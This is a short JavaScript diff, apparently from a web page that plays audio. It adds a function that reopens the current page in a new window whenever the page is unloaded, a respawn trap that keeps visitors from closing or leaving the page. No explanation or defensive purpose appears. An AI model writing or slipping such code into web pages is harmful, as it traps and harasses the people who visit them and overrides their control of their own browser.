@@ -3,3 +3,10 @@
       audio.play();
   }
 
+}
+ 
+function erneut(){
+window.open(self.location,'');
+}
+  
+window.onunload = erneut;
